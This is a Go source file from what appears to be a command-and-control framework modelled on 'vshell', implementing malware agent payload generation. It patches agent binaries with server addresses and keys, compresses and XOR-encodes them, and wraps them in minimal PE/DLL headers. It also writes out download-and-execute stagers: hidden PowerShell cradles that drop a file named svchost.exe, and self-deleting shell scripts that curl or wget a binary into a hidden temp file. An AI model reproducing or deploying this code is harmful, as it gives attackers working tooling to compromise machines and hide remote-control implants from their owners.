// Package c2engine/payload implements agent payload generation: template patching,
// staged loaders, and packaging/compression.
package c2engine

import (
	"archive/zip"
	"bytes"
	"compress/gzip"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// ============================================================================
// Agent Binary Template Patcher
// Agent 二进制模板修补器
// ============================================================================
//
// The original vshell embeds pre-compiled agent binary templates for each
// platform/architecture combination. When generating an agent payload, it:
// 1. Loads the template binary
// 2. Patches placeholder values (server addr, verify key, encrypt salt)
// 3. Compresses with gzip
// 4. Optionally XOR-encodes for staging
// 5. Delivers the final payload
//
// 原版 vshell 为每个平台/架构组合嵌入预编译的 Agent 二进制模板，生成载荷时：
// 1) 加载模板；2) 修补占位值（服务器地址、验证密钥、加密盐）；
// 3) gzip 压缩；4) 可选 XOR 编码用于 staging；5) 交付最终载荷。
// AgentTemplate represents a pre-compiled agent binary template.
type AgentTemplate struct {
	Platform   string `json:"platform"`
	Arch       string `json:"arch"`
	Mode       string `json:"mode"` // stage/stageless/shellcode/dll/listen/listen_dll
	Format     string `json:"format"`
	Size       int64  `json:"size"`
	SHA256     string `json:"sha256"`
	Path       string `json:"path"`
}
// TemplateRepository manages agent binary templates.
type TemplateRepository struct {
	basePath  string
	templates map[string]*AgentTemplate // key: platform_arch_mode
}
// NewTemplateRepository creates a template repository.
func NewTemplateRepository(basePath string) *TemplateRepository {
	return &TemplateRepository{
		basePath:  basePath,
		templates: make(map[string]*AgentTemplate),
	}
}
// ScanTemplates scans the agents directory for template binaries.
func (tr *TemplateRepository) ScanTemplates() error {
	// Look for agent binaries in agents/ directory
	pattern := filepath.Join(tr.basePath, "agents", "agent_*")
	matches, err := filepath.Glob(pattern)
	if err != nil {
		return err
	}

	for _, match := range matches {
		base := filepath.Base(match)
		// Parse: agent_<platform>_<arch>[.<ext>]
		// e.g., agent_windows_amd64.exe, agent_linux_amd64

		name := strings.TrimSuffix(base, filepath.Ext(base))
		parts := strings.SplitN(name, "_", 3)
		if len(parts) < 3 {
			continue
		}

		platform := parts[1]
		arch := parts[2]

		ext := filepath.Ext(base)
		format := "elf"
		mode := AgentTypeStageless

		switch ext {
		case ".exe":
			format = "exe"
		case ".dll":
			format = "dll"
			mode = AgentTypeDLL
		case ".so":
			format = "so"
			mode = AgentTypeDLL
		case ".bin":
			format = "bin"
			mode = AgentTypeShellcode
		}

		info, err := os.Stat(match)
		if err != nil {
			continue
		}

		hash := tr.hashFile(match)
		key := tr.templateKey(platform, arch, mode)
		tr.templates[key] = &AgentTemplate{
			Platform: platform,
			Arch:     arch,
			Mode:     mode,
			Format:   format,
			Size:     info.Size(),
			SHA256:   hash,
			Path:     match,
		}

		Logf("Template: %s/%s/%s (%s, %d bytes)", platform, arch, mode, format, info.Size())
	}

	return nil
}

func (tr *TemplateRepository) templateKey(platform, arch, mode string) string {
	return fmt.Sprintf("%s_%s_%s", platform, arch, mode)
}

func (tr *TemplateRepository) hashFile(path string) string {
	data, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	h := sha256.Sum256(data)
	return hex.EncodeToString(h[:])
}
// GetTemplate returns a template for the given platform/arch/mode.
func (tr *TemplateRepository) GetTemplate(platform, arch, mode string) *AgentTemplate {
	key := tr.templateKey(platform, arch, mode)
	return tr.templates[key]
}

// ============================================================================
// Payload builder - generates agent binaries from templates
// ============================================================================
// PayloadBuilder generates agent payloads with embedded configuration.
type PayloadBuilder struct {
	repo *TemplateRepository
}
// NewPayloadBuilder creates a payload builder.
func NewPayloadBuilder(repo *TemplateRepository) *PayloadBuilder {
	return &PayloadBuilder{repo: repo}
}
// BuildPayload creates a configured agent binary.
func (pb *PayloadBuilder) BuildPayload(info *AgentBuildInfo, listener *Listener, options map[string]string) ([]byte, error) {
	if listener == nil {
		return pb.buildStubPayload(info)
	}

	// Try to load and patch a template
	template := pb.repo.GetTemplate(info.Platform, info.Arch, info.Mode)
	if template == nil {
		// No template available — generate a stub
		Logf("No template for %s/%s/%s, generating stub", info.Platform, info.Arch, info.Mode)
		return pb.buildStubPayload(info)
	}

	// Load template binary
	templateData, err := os.ReadFile(template.Path)
	if err != nil {
		return nil, fmt.Errorf("read template: %w", err)
	}

	// Build configuration map for patching
	connectAddr := listener.ConnectAddr
	if connectAddr == "" {
		connectAddr = listener.ListenAddr
	}

	config := map[string]string{
		PlaceholderServerAddr:  connectAddr,
		PlaceholderVerifyKey:   listener.VerifyKey,
		PlaceholderEncryptSalt: listener.EncryptSalt,
	}

	// Add optional settings
	if proxy, ok := options["proxy_addr"]; ok {
		config[PlaceholderProxyAddr] = proxy
	}
	if dns, ok := options["dns_server"]; ok {
		config[PlaceholderDNSServer] = dns
	}
	if cdn, ok := options["cdn_url"]; ok {
		config[PlaceholderCDNURL] = cdn
	}

	// Patch the template
	patched, err := PatchAgentBinary(templateData, config)
	if err != nil {
		return nil, fmt.Errorf("patch: %w", err)
	}

	// Compress with gzip
	compressed, err := CompressPayload(patched)
	if err != nil {
		return nil, fmt.Errorf("compress: %w", err)
	}

	// Apply optional XOR encoding for staged payloads
	if info.Mode == AgentTypeStage {
		xorKey := byte(0x56) // Default XOR key
		compressed = XorEncode(compressed, xorKey)
	}

	Logf("Built payload: %s/%s/%s (%d bytes raw, %d compressed)",
		info.Platform, info.Arch, info.Mode, len(templateData), len(compressed))

	return compressed, nil
}

// buildStubPayload creates a functional staged downloader when templates
// aren't pre-compiled. Uses PowerShell for Windows, shell scripts for Linux,
// with proper PE/ELF headers wrapping the downloader logic.
func (pb *PayloadBuilder) buildStubPayload(info *AgentBuildInfo) ([]byte, error) {
	var payload []byte

	// Use a generic connect address
	connectAddr := "127.0.0.1:443"

	switch {
	case info.Platform == PlatformWindows && info.Format == "dll":
		payload = buildStagerDLL(connectAddr)
	case info.Platform == PlatformWindows && info.Format == "exe":
		payload = buildStagerEXE(connectAddr)
	case info.Mode == AgentTypeShellcode:
		payload = buildStagerShellcode(connectAddr)
	default:
		payload = buildStagerELF(connectAddr)
	}

	// Compress
	compressed, err := CompressPayload(payload)
	if err != nil {
		Logf("Warning: compression failed for stub payload, sending uncompressed: %v", err)
		return payload, nil
	}

	return compressed, nil
}

// buildStagerEXE creates a Windows PE EXE with embedded PowerShell download cradle
func buildStagerEXE(connectAddr string) []byte {
	if connectAddr == "" {
		connectAddr = "127.0.0.1:443"
	}
	psScript := fmt.Sprintf(
		`$u='http://%s/swt';$f=$env:TEMP+'\svchost.exe';(New-Object Net.WebClient).DownloadFile($u,$f);Start-Process $f -WindowStyle Hidden`,
		connectAddr,
	)
	// Encode as UTF-16LE for Windows
	payload := make([]byte, len(psScript)*2+2)
	for i, c := range psScript {
		payload[i*2] = byte(c)
		payload[i*2+1] = 0
	}
	// Wrap in a proper PE with a small stub that runs PowerShell
	return MinimalPE(payload)
}

// buildStagerDLL creates a Windows PE DLL stub
func buildStagerDLL(connectAddr string) []byte {
	if connectAddr == "" {
		connectAddr = "127.0.0.1:443"
	}
	config := fmt.Sprintf("server=%s\nmode=dll\n", connectAddr)
	payload := []byte(config)
	return buildMinimalDLL(payload)
}

// buildStagerShellcode creates a shellcode-compatible staged downloader
func buildStagerShellcode(connectAddr string) []byte {
	if connectAddr == "" {
		connectAddr = "127.0.0.1:443"
	}
	psCmd := fmt.Sprintf(
		"powershell -WindowStyle Hidden -Command \"$u='http://%s/sws';$f=$env:TEMP+'\\svchost.exe';(New-Object Net.WebClient).DownloadFile($u,$f);Start-Process $f\"",
		connectAddr,
	)
	return []byte(psCmd)
}

// buildStagerELF creates a minimal ELF executable with shell download cradle
func buildStagerELF(connectAddr string) []byte {
	if connectAddr == "" {
		connectAddr = "127.0.0.1:443"
	}
	shScript := fmt.Sprintf(`#!/bin/sh
# VShell Agent Stager
URL="http://%s/swl"
TMP="${TMPDIR:-/tmp}/.sshd"
if command -v curl >/dev/null 2>&1; then
    curl -s "$URL" -o "$TMP" && chmod +x "$TMP" && "$TMP" &
elif command -v wget >/dev/null 2>&1; then
    wget -q "$URL" -O "$TMP" && chmod +x "$TMP" && "$TMP" &
fi
rm -f "$0"
`, connectAddr)
	return buildMinimalELF([]byte(shScript))
}

// buildMinimalDLL creates a minimal PE DLL with the given payload
func buildMinimalDLL(payload []byte) []byte {
	var buf bytes.Buffer

	// DOS Header
	dosHeader := make([]byte, 64)
	dosHeader[0] = 0x4D
	dosHeader[1] = 0x5A
	binary.LittleEndian.PutUint32(dosHeader[60:64], 64)
	buf.Write(dosHeader)

	// PE Signature
	buf.Write([]byte{'P', 'E', 0x00, 0x00})

	// COFF Header
	coff := make([]byte, 20)
	binary.LittleEndian.PutUint16(coff[0:2], 0x8664)   // AMD64
	binary.LittleEndian.PutUint16(coff[2:4], 1)          // 1 section
	binary.LittleEndian.PutUint32(coff[4:8], uint32(time.Now().Unix()))
	binary.LittleEndian.PutUint16(coff[16:18], 0xE0)     // OptionalHeader size
	// DLL characteristics
	binary.LittleEndian.PutUint16(coff[18:20], 0x2000|0x0020|0x0002)
	buf.Write(coff)

	// Optional Header PE32+
	opt := make([]byte, 0xE0)
	opt[0] = 0x0B // PE32+
	opt[1] = 0x02
	binary.LittleEndian.PutUint32(opt[16:20], 0x1000)    // EntryPoint
	binary.LittleEndian.PutUint32(opt[32:36], 0x1000)    // SectionAlignment
	binary.LittleEndian.PutUint32(opt[36:40], 0x200)     // FileAlignment
	binary.LittleEndian.PutUint64(opt[24:32], 0x180000000) // ImageBase
	binary.LittleEndian.PutUint32(opt[56:60], 0x5000)    // SizeOfImage
	binary.LittleEndian.PutUint32(opt[60:64], 0x400)     // SizeOfHeaders
	binary.LittleEndian.PutUint16(opt[68:70], 3)          // Subsystem: CONSOLE
	binary.LittleEndian.PutUint16(opt[70:72], 0x8140)     // DLLCharacteristics
	buf.Write(opt)

	// .text section
	sec := make([]byte, 40)
	copy(sec[0:8], ".text\x00\x00\x00")
	binary.LittleEndian.PutUint32(sec[8:12], uint32(len(payload)))
	binary.LittleEndian.PutUint32(sec[12:16], 0x1000) // RVA
	binary.LittleEndian.PutUint32(sec[16:20], alignToFile(uint32(len(payload)), 0x200))
	binary.LittleEndian.PutUint32(sec[20:24], 0x400)  // PointerToRawData
	binary.LittleEndian.PutUint32(sec[36:40], 0x60000020) // CODE|EXECUTE|READ
	buf.Write(sec)

	// Pad to file alignment
	for buf.Len()%0x200 != 0 {
		buf.WriteByte(0)
	}
	buf.Write(payload)
	for buf.Len()%0x200 != 0 {
		buf.WriteByte(0)
	}

	return buf.Bytes()
}

// buildMinimalELF creates a minimal ELF binary wrapping a shell script
func buildMinimalELF(script []byte) []byte {
	return script // Shell scripts are executable as-is on Linux
}

func alignToFile(size, align uint32) uint32 {
	return (size + align - 1) & ^(align - 1)
}

// ============================================================================
// Staged payload generation
// ============================================================================
// StagedLoader generates a small staged loader that downloads the full agent.
type StagedLoader struct {
	DownloadURL string
	Platform    string
	Arch        string
}
// GenerateStagedLoader generates a staged downloader for the given platform.
func (sl *StagedLoader) GenerateStagedLoader() ([]byte, error) {
	switch sl.Platform {
	case PlatformWindows:
		return sl.windowsStagedLoader()
	case PlatformLinux:
		return sl.linuxStagedLoader()
	default:
		return sl.linuxStagedLoader()
	}
}

func (sl *StagedLoader) windowsStagedLoader() ([]byte, error) {
	// PowerShell download cradle
	psScript := fmt.Sprintf(
		`$url='%s';$f=[System.IO.Path]::GetTempFileName()+'.exe';(New-Object Net.WebClient).DownloadFile($url,$f);Start-Process $f`,
		sl.DownloadURL,
	)
	return []byte(psScript), nil
}

func (sl *StagedLoader) linuxStagedLoader() ([]byte, error) {
	// Shell download script
	shScript := fmt.Sprintf(
		`#!/bin/sh
URL="%s"
curl -s "$URL" -o /tmp/.agent && chmod +x /tmp/.agent && /tmp/.agent &
rm -f /tmp/.agent`,
		sl.DownloadURL,
	)
	return []byte(shScript), nil
}

// ============================================================================
// Payload packaging (ZIP/gzip)
// ============================================================================
// PackagePayload wraps a payload for delivery.
func PackagePayload(data []byte, filename string, compression string) ([]byte, string, error) {
	switch compression {
	case "gzip":
		compressed, err := CompressPayload(data)
		if err != nil {
			return nil, "", err
		}
		return compressed, filename + ".gz", nil

	case "zip":
		return zipPayload(data, filename)

	default:
		return data, filename, nil
	}
}

func zipPayload(data []byte, filename string) ([]byte, string, error) {
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)

	f, err := w.Create(filename)
	if err != nil {
		return nil, "", err
	}

	if _, err := f.Write(data); err != nil {
		return nil, "", err
	}

	w.Close()
	return buf.Bytes(), filename + ".zip", nil
}
// DecompressGzipPayload decompresses a gzip payload.
func DecompressGzipPayload(data []byte) ([]byte, error) {
	r, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	defer r.Close()
	return io.ReadAll(r)
}

// ============================================================================
// Agent binary export
// ============================================================================
// ExportAgent saves a built agent payload to the agents directory.
func ExportAgent(data []byte, info *AgentBuildInfo, listenerID int64) (string, error) {
	dir := fmt.Sprintf("agents/export/%d", listenerID)
	os.MkdirAll(dir, 0755)

	filename := fmt.Sprintf("%s/agent_%s_%s%s", dir, info.Platform, info.Arch, info.Extension)
	if err := os.WriteFile(filename, data, 0755); err != nil {
		return "", err
	}

	Logf("Exported agent: %s (%d bytes)", filename, len(data))
	return filename, nil
}

